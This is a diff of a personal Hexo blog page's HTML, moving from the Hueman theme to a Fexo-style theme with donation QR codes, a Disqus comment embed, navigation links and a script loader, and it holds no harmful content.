-            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
-        });
-    })(jQuery);
-</script>
-
-        </footer>
-    </div>
+    
+  </div>
 </article>
 
-    <section id="comments">
-    
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul class="theme.donation.items.length">
         
-    <div id="disqus_thread">
-        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-    </div>
-
-    
-    </section>
-
-                        </div>
-                    </section>
-                    <aside id="sidebar">
-    <a class="sidebar-toggle" title="Expand Sidebar"><i class="toggle icon"></i></a>
-    <div class="sidebar-top">
-        <p>follow:</p>
-        <ul class="social-links">
-            
-                
-                <li>
-                    <a class="social-tooltip" title="twitter" href="/" target="_blank">
-                        <i class="icon fa fa-twitter"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="facebook" href="/" target="_blank">
-                        <i class="icon fa fa-facebook"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="google-plus" href="/" target="_blank">
-                        <i class="icon fa fa-google-plus"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="github" href="https://github.com/ppoffice/hexo-theme-hueman" target="_blank">
-                        <i class="icon fa fa-github"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="weibo" href="/" target="_blank">
-                        <i class="icon fa fa-weibo"></i>
-                    </a>
-                </li>
-                
-            
-                
-                <li>
-                    <a class="social-tooltip" title="rss" href="/" target="_blank">
-                        <i class="icon fa fa-rss"></i>
-                    </a>
-                </li>
-                
-            
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+          <li class="item">
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
         </ul>
+      </div>
     </div>
-    
-        
-<nav id="article-nav">
-    
-        <a href="/2016/08/17/微信公众平台开发入门/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">newer</strong>
-        <p class="article-nav-title">
-        
-            微信公众平台开发入门
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2016/08/19/小程序（1）—— 内网扫描工具/">
+        <i class="icon icon-angle-left"></i>
     </a>
-    
-    
-        <a href="/2016/08/17/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">older</strong>
-        <p class="article-nav-title">Bonjour Monde</p>
-        <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
-        </a>
-    
-</nav>
+    <a class="show pull-right" href="/2016/08/26/小程序（2）—— openwall爬虫工具/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
 
-    
-    <div class="widgets-container">
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">Close</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
         
-            
-                
-    <div class="widget-wrap">
-        <h3 class="widget-title">recents</h3>
-        <div class="widget">
-            <ul id="recent-post" class="">
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/19/小程序（1）——内网扫描工具/" class="thumbnail">
-    
-    
-        <span style="background-image:url(./md4_images/2016-08-19_162049.png)" alt="小程序（1）——内网扫描工具" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/19/小程序（1）——内网扫描工具/" class="title">小程序（1）——内网扫描工具</a></p>
-                            <p class="item-date"><time datetime="2016-08-19T09:11:04.596Z" itemprop="datePublished">2016-08-19</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/17/微信公众平台开发入门/" class="thumbnail">
-    
-    
-        <span style="background-image:url(./md3_images/1466131005951.jpg)" alt="微信公众平台开发入门" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/17/微信公众平台开发入门/" class="title">微信公众平台开发入门</a></p>
-                            <p class="item-date"><time datetime="2016-08-17T13:24:17.022Z" itemprop="datePublished">2016-08-17</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/17/PHP序列化学习总结/" class="thumbnail">
-    
-    
-        <span style="background-image:url(./md2_images/1468567761183.jpg)" alt="PHP序列化学习总结" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/17/PHP序列化学习总结/" class="title">PHP序列化学习总结</a></p>
-                            <p class="item-date"><time datetime="2016-08-17T08:44:33.862Z" itemprop="datePublished">2016-08-17</time></p>
-                        </div>
-                    </li>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2016/08/17/hello-world/" class="thumbnail">
-    
-    
-        <span style="background-image:url(./md1_images/hello.jpg)" alt="Bonjour Monde" class="thumbnail-image"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"></p>
-                            <p class="item-title"><a href="/2016/08/17/hello-world/" class="title">Bonjour Monde</a></p>
-                            <p class="item-date"><time datetime="2016-08-17T07:00:48.782Z" itemprop="datePublished">2016-08-17</time></p>
-                        </div>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
-
-            
-                
-
-            
-                
-    <div class="widget-wrap widget-list">
-        <h3 class="widget-title">archives</h3>
-        <div class="widget">
-            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">4</span></li></ul>
-        </div>
-    </div>
-
-
-            
-                
-    <div class="widget-wrap widget-list">
-        <h3 class="widget-title">tags</h3>
-        <div class="widget">
-            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-session-对象/">php,session,对象</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网漫游-socks-reGrorg/">内网漫游,socks,reGrorg</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/微信-php-mysql/">微信,php,mysql</a><span class="tag-list-count">1</span></li></ul>
-        </div>
-    </div>
-
-
-            
-                
-    <div class="widget-wrap widget-float">
-        <h3 class="widget-title">tag cloud</h3>
-        <div class="widget tagcloud">
-            <a href="/tags/php-session-对象/" style="font-size: 10px;">php,session,对象</a> <a href="/tags/内网漫游-socks-reGrorg/" style="font-size: 10px;">内网漫游,socks,reGrorg</a> <a href="/tags/微信-php-mysql/" style="font-size: 10px;">微信,php,mysql</a>
-        </div>
-    </div>
-
-
-            
-                
-    <div class="widget-wrap widget-list">
-        <h3 class="widget-title">links</h3>
-        <div class="widget">
-            <ul>
-                
-                    <li>
-                        <a href="http://hexo.io">Hexo</a>
-                    </li>
-                
-            </ul>
-        </div>
-    </div>
-
-
-            
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
         
-    </div>
-</aside>
-                </div>
-            </div>
-        </div>
-        <footer id="footer">
-    <div class="container">
-        <div class="container-inner">
-            <a id="back-to-top" href="javascript:;"><i class="icon fa fa-angle-up"></i></a>
-            <div class="credit">
-                <h1 class="logo-wrap">
-                    <a href="/" class="logo"></a>
-                </h1>
-                <p>&copy; 2016 John Doe</p>
-                <p>Powered by <a href="//hexo.io/" target="_blank">Hexo</a>. Theme by <a href="//github.com/ppoffice" target="_blank">PPOffice</a></p>
-            </div>
-        </div>
-    </div>
-</footer>
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
         
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/atom.xml"
+              rel="noopener noreferrer"
+              target="_blank"
+              >
+              RSS
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
     
-    <script>
-    var disqus_shortname = 'hexo-theme-hueman';
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
     
+    var disqus_url = 'https://kovige.github.io/2016/08/25/PHP序列化学习总结/';
     
-    var disqus_url = 'https://kovige.github.io/2016/08/17/PHP序列化学习总结/';
-    
-    (function() {
-    var dsq = document.createElement('script');
-    dsq.type = 'text/javascript';
-    dsq.async = true;
-    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
-    </script>
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
 
 
 
     
-        <script src="/vendor/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
     
 
-    
-        <script src="/vendor/scrollLoading/jquery.scrollLoading.js"></script>
-        <script src="/vendor/scrollLoading/main.js"></script>
-    
+  </div>
 
+  
 
-<!-- Custom Scripts -->
-<script src="/js/main.js"></script>
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
 
-    </div>
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
 </body>
 </html>
